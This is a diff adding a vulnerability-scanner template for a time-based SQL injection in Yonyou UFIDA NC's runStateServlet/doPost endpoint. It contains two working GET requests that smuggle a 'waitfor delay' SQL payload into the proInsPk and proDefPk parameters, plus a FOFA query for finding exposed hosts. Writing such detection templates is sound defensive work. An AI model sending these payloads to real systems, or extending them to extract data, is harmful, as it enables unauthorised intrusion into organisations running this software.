@@ -1,0 +1,32 @@
+id: yonyou-nc-runStateServlet-doPost-sqli
+
+info:
+  name: 用友 UFIDA NC runStateServlet/doPost - sqli
+  author: leadlife
+  severity: high
+  description: Detects SQL Injection vulnerability in Yonyou NC runStateServlet.
+  reference: 
+    - https://github.com/wy876/POC/blob/c19942e30121f116548ca14c0375ba6c8560afeb/%E7%94%A8%E5%8F%8BNC-runStateServlet%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: false
+    fofa-query: icon_hash="1085941792" || app="用友-UFIDA-NC"
+    sqlmap: 
+  tags: yonyou,sqli,nc,oa,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /portal/pt/servlet/runStateServlet/doPost?pageId=login&proInsPk=1'waitfor+delay+'0:0:6'-- HTTP/1.1
+        Host: {{Hostname}}
+      
+      - |
+        @timeout: 15s
+        GET /portal/pt/servlet/runStateServlet/doPost?pageId=login&proDefPk=1'waitfor+delay+'0:0:6'-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5 && duration < 9
+        condition: and
